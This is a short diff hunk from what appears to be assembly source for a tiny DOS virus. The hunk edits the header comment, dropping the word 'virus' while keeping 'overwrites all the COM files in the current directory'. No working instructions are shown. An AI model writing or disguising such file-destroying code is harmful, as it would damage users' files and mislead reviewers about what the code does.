@@ -1,4 +1,4 @@
-;44 byte virus, overwrites all the COM files in the current directory.
+; overwrites all the COM files in the current directory.
 .model  small
 
 .code
